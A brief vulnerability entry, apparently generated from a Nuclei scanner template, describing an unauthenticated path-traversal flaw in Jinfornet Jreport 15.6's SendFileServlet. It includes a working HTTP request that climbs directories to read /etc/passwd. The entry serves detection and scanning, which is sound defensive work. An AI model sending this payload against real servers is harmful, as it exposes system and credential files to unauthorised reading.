# Vulnerability: Jinfornet Jreport 15.6 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`jinfornet-jreport-lfi.yaml`)

## Description
Jinfornet Jreport 15.6 is vulnerable to local file incluion via the Jreport Help function in the SendFileServlet. Exploitaiton allows remote unauthenticated users to view any files on the Operating System with Application services user permission. This vulnerability affects Windows and Unix operating systems.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd
```

